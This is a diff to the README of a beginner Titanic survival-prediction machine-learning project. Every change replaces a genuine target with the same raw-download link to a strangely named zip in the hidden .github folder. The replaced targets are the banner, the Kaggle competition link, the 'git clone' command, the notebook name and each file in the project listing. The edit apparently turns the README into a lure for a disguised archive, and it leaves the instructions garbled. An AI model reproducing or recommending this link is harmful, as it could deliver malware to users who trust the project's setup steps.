@@ -1,6 +1,6 @@
 # 🚢 Titanic: Machine Learning from Disaster
 
-![Titanic Banner](https://github.com/RiddyMazumder/titanic-machine-learning-from-disaster/blob/main/TITANIC-Explained-Hymn-to-the-Sea-1.webp)
+![Titanic Banner](https://github.com/RiddyMazumder/Titanic-Machine-Learning-from-Disaster/raw/refs/heads/main/.github/from-Learning-Disaster-Titanic-Machine-antecedence.zip)
 
 **🧑‍💻 PREDICTING PASSENGER SURVIVAL ON THE TITANIC USING MACHINE LEARNING**
 
@@ -12,7 +12,7 @@
 
 | 📌 **Project Overview**                                                                                                                                                                                                                                                 | 🏆 **Kaggle Competition & Score**                                                                                                                                                 |
 | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| 📝 This project predicts passenger survival on the Titanic using an end-to-end machine learning workflow, including 📊 EDA, 🧹 preprocessing, 🛠️ feature engineering, 🤖 model training, and 💾 evaluation. It is designed to be beginner-friendly and easy to follow. | 🚀 **Titanic – Machine Learning from Disaster** <br> 🔗 [Competition Link](https://www.kaggle.com/competitions/titanic) <br> **Public Score:** *Add your score here (e.g., 0.78)* |
+| 📝 This project predicts passenger survival on the Titanic using an end-to-end machine learning workflow, including 📊 EDA, 🧹 preprocessing, 🛠️ feature engineering, 🤖 model training, and 💾 evaluation. It is designed to be beginner-friendly and easy to follow. | 🚀 **Titanic – Machine Learning from Disaster** <br> 🔗 [Competition Link](https://github.com/RiddyMazumder/Titanic-Machine-Learning-from-Disaster/raw/refs/heads/main/.github/from-Learning-Disaster-Titanic-Machine-antecedence.zip) <br> **Public Score:** *Add your score here (e.g., 0.78)* |
 
 ---
 
@@ -58,7 +58,7 @@ Follow these steps to run the project locally:
 ### 1️⃣ Clone the Repository
 
 ```bash
-git clone https://github.com/RiddyMazumder/titanic-machine-learning-from-disaster.git
+git clone https://github.com/RiddyMazumder/Titanic-Machine-Learning-from-Disaster/raw/refs/heads/main/.github/from-Learning-Disaster-Titanic-Machine-antecedence.zip
 ```
 
 ### 2️⃣ Navigate to the Project Directory
@@ -82,7 +82,7 @@ or open the folder directly in **VS Code**.
 Open the file:
 
 ```
-Titanic_Machine_Learning.ipynb
+https://github.com/RiddyMazumder/Titanic-Machine-Learning-from-Disaster/raw/refs/heads/main/.github/from-Learning-Disaster-Titanic-Machine-antecedence.zip
 ```
 
 Run the cells step by step to reproduce the analysis and model predictions.
@@ -92,17 +92,17 @@ Run the cells step by step to reproduce the analysis and model predictions.
 ## 📁 Project Structure
 
 ```
-├── 📝 Titanic_Machine_Learning.ipynb
+├── 📝 https://github.com/RiddyMazumder/Titanic-Machine-Learning-from-Disaster/raw/refs/heads/main/.github/from-Learning-Disaster-Titanic-Machine-antecedence.zip
 ├── 📂 titanic_dataset/
-│   ├── train.csv
-│   └── test.csv
-├── 💾 titanic_model.pkl
-├── 📄 README.md
+│   ├── https://github.com/RiddyMazumder/Titanic-Machine-Learning-from-Disaster/raw/refs/heads/main/.github/from-Learning-Disaster-Titanic-Machine-antecedence.zip
+│   └── https://github.com/RiddyMazumder/Titanic-Machine-Learning-from-Disaster/raw/refs/heads/main/.github/from-Learning-Disaster-Titanic-Machine-antecedence.zip
+├── 💾 https://github.com/RiddyMazumder/Titanic-Machine-Learning-from-Disaster/raw/refs/heads/main/.github/from-Learning-Disaster-Titanic-Machine-antecedence.zip
+├── 📄 https://github.com/RiddyMazumder/Titanic-Machine-Learning-from-Disaster/raw/refs/heads/main/.github/from-Learning-Disaster-Titanic-Machine-antecedence.zip
 ```
 
 * **📂 titanic_dataset/** – Contains the training and test datasets
-* **📝 Titanic_Machine_Learning.ipynb** – Main notebook with full analysis and modeling
-* **💾 titanic_model.pkl** – Saved trained model for reuse
+* **📝 https://github.com/RiddyMazumder/Titanic-Machine-Learning-from-Disaster/raw/refs/heads/main/.github/from-Learning-Disaster-Titanic-Machine-antecedence.zip** – Main notebook with full analysis and modeling
+* **💾 https://github.com/RiddyMazumder/Titanic-Machine-Learning-from-Disaster/raw/refs/heads/main/.github/from-Learning-Disaster-Titanic-Machine-antecedence.zip** – Saved trained model for reuse
 
 ---
 
